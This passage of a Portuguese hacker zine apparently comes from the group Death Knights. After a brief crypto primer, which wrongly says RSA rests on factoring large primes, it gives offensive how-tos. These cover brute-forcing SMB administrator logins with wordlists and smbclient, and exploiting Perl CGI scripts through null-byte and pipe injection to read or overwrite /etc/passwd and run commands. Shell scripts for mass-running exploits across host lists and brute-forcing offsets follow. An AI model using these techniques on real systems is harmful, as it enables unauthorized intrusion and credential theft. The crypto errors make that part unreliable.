+Crie em sua empresa uma politica de seguranca.
+
+Utilize um firewall. Um firewall restringe acessos a um local cuidadosamente
+controlado, impede que invasores alcancem suas demais defesas e restringem
+saidas de um local cuidadosamente controlado.
+
+Lembre-se: um firewall nao pode te proteger contra pessoas internas, e contra
+acesso fisico.
+
+Use e abuse da criptografia. Criptografia e' um metodo utilizado para
+modificar m texto original de uma mensagem a ser transmitida, gerando um
+texto criptografado na origem, atraves de um processo de codificacao definido
+por um metodo de criptografia. O texto criptografado e' entao transmitido e,
+no destino, o inverso ocorre, isto e', o metodo de criptografia e' aplicado
+agora para decodificar o texto criptografado transformando-o no texto
+original.
+
+A criptografia pode ser simetrica ou assimetrica.
+
+* Criptografia Simetrica *
+**************************
+
+este metodo de criptografia consiste em substituir as letras de uma mensagem
+pela enesima letra apos a sua posicao no alfabeto.
+
+Exemplo:
+-------
+                   __________             __________
+                   | Cacaio |   <----->   | ^)^)8@ |
+                   ----------             ----------
+                     Texto                   Texto
+                     Plano               Criptografado
+
+Data Encryption Standard (DES): e' um dos principais metodos de criptografia
+baseada em chave secreta. Foi desenvolvido pela IBM e adotado pelo governo
+do E.U.A como metodo de criptografia padrao.
+
+O metodo DES codifica blocos de 64 bits de texto normal gerando 64 bits de
+texto criptografado. O algoritmo de codificacao e' parametrizado por uma
+chave K de 56 bits e possui 19 estagios diferentes.
+
+* Criptografia Assimetrica *
+****************************
+
+Este metodo de criptografia baseia-se na utilizacao de chaves distintas:
+uma para codificacao(E) e outra para decodificacao(D), escolhidas de forma
+que a derivacao de D a partir de E seja em termos praticos, senao impossivel,
+pelo menos dificil de ser realizada.
+
+Exemplo:
+-------
+                       A\.            ./B
+                          \.        ./
+                            \.    ./
+                              \../
+                              ./\.
+                            ./    \.
+                          ./        \.
+privada A      publica B./            \.publica A      privada B
+         \.                                          ./
+           \.                                      ./
+             \.                                  ./
+               \.                              ./
+                 \.                          ./
+                   \.                      ./
+                     \.                  ./
+                          Chave Secreta
+                           para A e B
+
+RSA: o mais importante metodo de criptografia assimetrico e' o RSA, cujo
+nome deriva das iniciais dos autores, Rivest, Shamir e Aldeman. O metodo
+RSA baseia-se na dificuldade de fatorar numeros primos muito grandes.
+
+E isso e' o basico da seguranca de dados. Para saber mais, leia, leia, leia
+ou leia.
+
+Cansei de escrever, vou ficar louco se eu escrever mais por hoje.
+Espero que este pouco que escrevi sem dar uma finalizacao possa ajudar alguem.
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  10  ]=-
+.--------------.
+| =    SMB    = \____________________________________________________________
+`----------------------------------------------------------------------------'
+                             por DaveMustaine
+
+Opa...nesta materia..vou ensinar como usar o smbclient nas suas brincadeiras.
+Bom....vamos a um poco de materia...basico!
+
+1. O que eh NETBios:
+Bom...isso ae..eh um protocolo de transporte e de sessao, de uso
+geral, primeiramente destinados a acesso de arkivos e impressao.
+(foda-se isso :) )
+
+2. Como ele trabalha.
+O netbios trabalha como modo de Broadcasting, assim..se uma makina
+recebe um determinado pacote..todas as outras que estiverem
+conectadas a elareceberao (isso em redelocal), mas soh akela que for
+makina-destino ira assimilar o pacote.
+
+tah bom..soh pra conhecer um poco..dele....agora vo falar como usa-la
+(porta 139 NetBios) para brincadeira..
+
+O que eu preciso?
+ingredientes:
+- o Samba instalado em seu linux ou *nix.
+- uma boa wordlist...nem precisa ser taum boa...media vc pega bastante
+coisa
+- um pokinho de paciencia
+- um prog. chamado NAT
+- que a porta (139) NetBios esteja aberta no Sistema-alvo.
+**************************************************************************
+
+1. Vc pega o tal do NAT(prog mencionado acima)...executa ele com o
+seguinte sintaxe:
+./nat -o logdahost -u listadeusuarios.txt -p listadesenhas.txt
+www.host.com
+
+[*]--- Reading usernames from listadeusuarios.txt
+[*]--- Reading passwords from listadesenhas.txt
+
+[*]--- Checking host: www.host.com
+
+-depois de executado..ele aparecera assim como esta acima:
+
+2. ae ele vai verifikar as senhas....eh um super brute force..bem rapidao
+mesmo......se ele achar senhas...e tal..ira aparecer algo assim:
+[*]--- Checking write access in: \\WWW\ADMIN$
+[*]--- WARNING: Directory is writeable: \\WWW\ADMIN$
+[*]--- Attempting to exercise .. bug on: \\WWW\ADMIN$
+[*]--- Checking write access in: \\WWW\C$
+[*]--- WARNING: Directory is writeable: \\WWW\C$
+[*]--- Attempting to exercise .. bug on: \\WWW\C$
+Connected to share \\WWW\ADMIN$ as user `ADMINISTRATOR' pass `12345'
+Connected to share \\WWW\C$ as user `ADMINISTRATOR' pass `12345'
+
+* repare acima..que esta escrito WRITEABLE..vc tem acesso para
+ler...escrever..e apagar..tipow..faze tudo =-)
+
+3. se aparecer isso...pinga...vc tah cum senhas..para entrar...agora
+vc ira usar o smbclient....
+
+4. Pronto..vc tem as senhas..agora siga o exemplo..abaixo..relacionado
+com o exemplo assim.
+Vamos dizer que nos achamos essas senhas..agora vc faz assim:
+
+smbclient ////WWW//ADMIN$ -U "ADMINSTRATOR" -I www.host.com
+
+Added interface ip=127.0.0.1 bcast=127.255.255.255 nmask=255.0.0.0
+password:
+
+aki acima..vc digita a password...e entra..pronto..o password vc sabe neh?
+leia acima lah.... '12345' (sem as aspas eh claro)...os comandos do
+smbclient..eh kuase igual ao ftp...digita help lah..q vc vera...
+
+OBS: No arkivo listadeusuarios.txt ..pode ser bem pequeno...use somente
+os users mais conhecidos..e que lhe tragam alguma vantagem se vc conseguir
+as senhas...os conhecidos saum o : ADMIN, ADMINISTRATOR, BACKUP, DEMO e
+ROOT ..o mais comum eh o ADMINISTRATOR..
+por exemplo: se o sistema que vc ker invadir..eh Rwindowze...uso somente o
+ADMINISTRATOR E ADMIN...se for um *nix... use ROOT, ADMINISTRATOR,
+BACKUP, e outros ae...saum os melhores..e que trarao resultado proce.
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Valeu ae galera....muitos podem achar isso uma lamisse...outros podem
+achar isso legal..naum me importo...quem nunca usou acha isso uma
+merda?...eu achava isso tbm.... achava pq eu naum sabia...pq uma coisa eh
+certa..qualquer conhecimento...mesmo que seja uma coisa meio "besta" vale
+muito mais que uma coisa que vc naum sabe..e pensa que eh para lammers..e
+naum leh por pura preguica...entaum..cada um faz o que kizer..eu prefiro
+que voces leem e quem naum sabe sobre isso...aprenda..pq eh
+facil...blah...blah..falo...chega.
+
+Intel + ..falo.
+
+     DaveMustaine
+     `'`'`'`'`'`'
+
+-=[  11  ]=-
+.------------------------.
+| = Como explorar CGI's = \__________________________________________________
+`----------------------------------------------------------------------------'
+                               por Cacaio
+
+Os scripts CGI sao feitos com o proposito de usar as requisicoes do
+cliente e do servidor e entao se tornar meio que uma "ponte" entre eles.
+Se alguem pode mudar as variaveis em um script cgi, entao ele vai a uma camada
+inferior no servidor para o servidor executar o que foi pedido.
+
+Algumas falhas obvias:
+
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+# este script e' para voce dar o nome de um arquivo e o script o abrir
+# adicionando o tdk a sua extensao.
+$pedido = $ENV{'QUERY_STRING'};
+open(HTMLFILE, "<$pedido.tdk");
+while(<HTMLFILE>) {
+      print;
+}
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+
+Olhando rapidamente, tudo parece certo, correto?
+Nao! Vamos dizer que os arquivos .tdk sao arquivos de bancos de dados.
+Se quisermos abrir um arquivo como teste.tdk nos iriamos a:
+http://servidor.com/cgi-bin/cgizaum.cgi?teste
+e isso abriria o teste.tdk e o mostraria.
+
+Se o servidor tem um arquivo .htpasswd, por exemplo, e voce quer abrir ele,
+voce vai usar cgizaum.cgi?.htpasswd . Isso vai fazer o cgi tentar abrir
+.htpasswd.tdk o qual nao existe. Mas com um truque simples podemos pegar este
+arquivo. Ao inves de abrir cgizaum.cgi?.htpasswd, nos vamos abrir
+cgizaum.cgi?.htpasswd%00
+
+O perl vai ver isso como .htpasswd\0, e vai interpretar este \0 como um
+limite. Entao, vai se livrar do .tdk e vai abrir pra voce o .htpasswd.
+
+Tambem pode ser usado neste caso cgizaum.cgi?cgizaum.cgi%00, e assim vermos
+o codigo fonte do script.
+
+Outro exemplo disso e' quando o script nao deixa voce ter acesso a algum
+arquivo...
+
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+# este e' um exemplo no qual voce pode escrever em um arquivo, mas antes
+# checa se pode escrever no arquivo escolhido
+
+$openfile = "/etc/passwd\0hahaenganeioscript";
+die "voce nao ta abrindo meu arquivo passwd" if ($openfile eq "/etc/passwd");
+if (-e $openfile) {
+   open(FILE, ">$openfile");
+   }
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+
+Este exemplo nao e' dificil de se entender.
+
+Ele tenta ter certeza de que voce pode acessar o /etc/passwd checando com
+o "if". Novamente, o truque do \0 pode ser usado e assim poderemos escrever
+no /etc/passwd.
+
+Uma maneira facil de previnir este tipo de coisas e' simplesmente nao aceitar
+alguns caracteres.
+
+Colocando a seguinte linha, voce ja nao aceita o /0.
+
+if ($file =~ s/\0//g) { die "nao funciona aqui"; } else { #seu script aki }
+
+     .-----------------------.
+     | O problema do open()   `--------------------------------.
+     `==========-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+observe o seguinte script:
+
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+$file = $ENV{'QUERY_STRING'};
+open (FILE, $file);
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+
+Se pedirmos pra abrir o index.html, ele vai abrir o index.html.
+Mas se voce adicionar um | ao parametro, o open vai tentar executar.
+
+Por exemplo:
+
+-> if $file = /bin/sh;
+
+vai apenas abrir o /bin/sh e mostrar codigos binarios.
+
+-> if $file = /bin/sh|;
+
+vai rodar o /bin/sh.
+
+Como tirar proveito disso? Por exemplo:
+
+-> $file = "/bin/cat /etc/passwd > /home/httpd/html/passwd.html|";
+
+Isso sera' executado. agora use '$file = "paswd.html"' e entao voce tera
+o passwd (considerando que o /etc/passwd esta' acessivel).
+
+Isso conclui esta materia.
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`'
+
+-=[  12  ]=-
+.------------------------.
+| = Brinquedinhos bobos = \__________________________________________________
+`----------------------------------------------------------------------------'
+                               por Cacaio
+
+Aqui estao alguns brinquedinhos bobos construidos a pedidos de amigos.
+Sao apenas dois shell scripts, que podem ser uteis, inuteis ou ate' comicos.
+
+O primeiro:
+
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+#!/bin/sh
+
+if [ $# -ne 2 ]
+then
+  echo "Lixo Scanner 1.pigarro por Cacaio"
+  echo "http://www.deathknights.com"
+  echo "Exploita uma lista d hosts 1 por 1 com qualquer exploit"
+  echo "Uso: $0 <exploit> <lista>"
+  exit 1
+fi
+
+for target in `cat $2`
+do
+  echo Checando $target ...
+  $1 $target
+done
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+
+Acho que de olhar o codigo dele deu pra entender.
+Nao deu? Uau! Ok.
+
+Ele roda um programa(exploit) em varios hosts diferentes, contidos em um
+arquivo, separados por linha.
+
+Se o seu exploit precisar de parametros, contrua outro script com o exploit e
+seus parametros e combine este script com o seu.
+
+O segundo:
+
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+#!/bin/bash
+
+offset=-5000
+#menor offset
+
+while [ $offset -lt 5000 ]; do
+#maior offset
+    /bin/sh `/caminho/programa $offset`
+    offset=`expr $offset + 100`
+#incrementacao do offset
+done
+
+echo "...pronto!"
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+
+Tambem simples de entender. As vezes voce precisa usar um programa com varios
+offsets diferentes.
+Este script vai executar o programa com offsets diferentes, conforme voce
+determinar.
+
+Onde temos "-5000" neste script, e' o menor offset a ser usado.
+Onde temos "5000" neste script, e' o offset maximo a ser usado.
+Onde temos "100" neste script, e' a incrementacao. Ele incrementaria -5000,
+-4900, -4800, ..., 1100, 1200,...
+
+Como o proprio titulo diz, sao brinquedos bobos.
+Como sao brinquedos, brinque com eles, use sua criatividade.
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`'
+
+-=[  13  ]=-
+.------------------.
+| Ultimas Palavras  \________________________________________________________
+`----------------------------------------------------------------------------'
+                                 por Cacaio
+
+        O zine nao acabou, e nem ira' acabar tao cedo. Mais edicoes estao
+        por vir, aguarde!
+
+        Se voce quiser mandar um e-mail dizendo o que achou do zine, dar su-
+        gestoes, reclamar, elogiar, meter o pau, colocar alguma materia,
+        conversar, ganhar dinheiro, jogar palitinho.. ops.. aih nao... algo
+        errado... mas mesmo assim, esteja a vontade.
+
+        AVISO:
+
+        Este grupo nao visa nenhum fim lucrativo. Mas se ganharmos alguma
+        coisinha nao reclamaremos. HEH. Nos fazemos isto por diversao e
+        nada mais. Qualquer uso das informacoes contidas aqui nao e de nossa
+        responsabilidade. Se voce fizer algo descrito e se der mal, problema
+        seu. Nos ensinamos, mas nao pedimos para usarem o conhecimento
+        adquirido com este zine.
+
+        Ate o proximo numero!
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+                            Criticas? Sugestoes?
+
+                           death@DeathKnights.com
+
+M]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FI
+M]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[   ]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FI
+M]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FI
+M]|[FIM]|                 |[FIM]|     |[FIM]|[FIM]        FIM        [FIM]|[FI
+M]|[FIM]|                 |[FIM]|     |[FIM]|[FIM   FI    FIM    IM   FIM]|[FI
+M]|[FIM]|     |[FIM]|[FIM]|[FIM]|     |[FIM]|[FIM   FI     I     IM   FIM]|[FI
+M]|[FIM]|     |[FIM]|[FIM]|[FIM]|     |[FIM]|[FIM   FIM    I    FIM   FIM]|[FI
+M]|[FIM]|           |[FIM]|[FIM]|     |[FIM]|[FIM   FIM         FIM   FIM]|[FI
+M]|[FIM]|        IM]|[FIM]|[FIM]|     |[FIM]|[FIM   FIM]       [FIM   FIM]|[FI
+M]|[FIM]|     |[FIM]|[FIM]|[FIM]|     |[FIM]|[FI   [FIM]|[   ]|[FIM   FIM]|[FI
+M]|[FIM]|     |[FIM]|[FIM]|[FIM]|     |[FIM]|[FI   [FIM]|[   ]|[FIM]   IM]|[FI
+M]|[FIM]|     |[FIM]|[FIM]|[FIM]|     |[FIM]|[FI   [FIM]|[F M]|[FIM]   IM]|[FI
+M]|[FIM]|     |[FIM]|[FIM]|[FIM]|     |[FIM]|[F    [FIM]|[F M]|[FIM]    M]|[FI
+M]|[FIM]|     |[FIM]|[FIM]|[FIM]|     |[FIM]|[F    [FIM]|[FIM]|[FIM]    M]|[FI
+M]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FI
+M]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FIM]|[FI
